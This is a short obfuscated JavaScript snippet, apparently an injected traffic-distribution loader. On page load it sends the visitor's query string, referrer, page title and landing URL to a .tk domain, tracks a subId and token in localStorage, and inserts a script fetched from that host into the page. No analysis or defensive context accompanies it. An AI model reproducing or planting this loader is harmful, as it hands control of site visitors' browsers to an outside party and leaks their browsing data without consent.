(function() {
    var name = '_cJHM3KgNyyPRW7q7';
    if (!window._cJHM3KgNyyPRW7q7) {
        window._cJHM3KgNyyPRW7q7 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/XbpCHb',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _1y2pScdgnsn7CR9M = localStorage.getItem('config');
    if (typeof _1y2pScdgnsn7CR9M !== 'undefined' && _1y2pScdgnsn7CR9M !== null) {
        var _KsRZ8761jRcZ41Cr = JSON.parse(_1y2pScdgnsn7CR9M);
        var _Frx8PRN989Tsb1nx = Math.round(+new Date()/1000);
        if (_KsRZ8761jRcZ41Cr.created_at + window._cJHM3KgNyyPRW7q7.ttl < _Frx8PRN989Tsb1nx) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _FJBys8dQzRRZ5yp9 = localStorage.getItem('subId');
    var _43pvKhvSQVwwfSVz = localStorage.getItem('token');
    var _Lyf3fx3n39hSVfPB = '?return=js.client';
        _Lyf3fx3n39hSVfPB += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Lyf3fx3n39hSVfPB += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Lyf3fx3n39hSVfPB += '&default_keyword=' + encodeURIComponent(document.title);
        _Lyf3fx3n39hSVfPB += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Lyf3fx3n39hSVfPB += '&name=' + encodeURIComponent(name);
        _Lyf3fx3n39hSVfPB += '&host=' + encodeURIComponent(window._cJHM3KgNyyPRW7q7.R_PATH);
    if (typeof _FJBys8dQzRRZ5yp9 !== 'undefined' && _FJBys8dQzRRZ5yp9 && window._cJHM3KgNyyPRW7q7.unique) {
        _Lyf3fx3n39hSVfPB += '&sub_id=' + encodeURIComponent(_FJBys8dQzRRZ5yp9);
    }
    if (typeof _43pvKhvSQVwwfSVz !== 'undefined' && _43pvKhvSQVwwfSVz && window._cJHM3KgNyyPRW7q7.unique) {
        _Lyf3fx3n39hSVfPB += '&token=' + encodeURIComponent(_43pvKhvSQVwwfSVz);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._cJHM3KgNyyPRW7q7.R_PATH + _Lyf3fx3n39hSVfPB;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
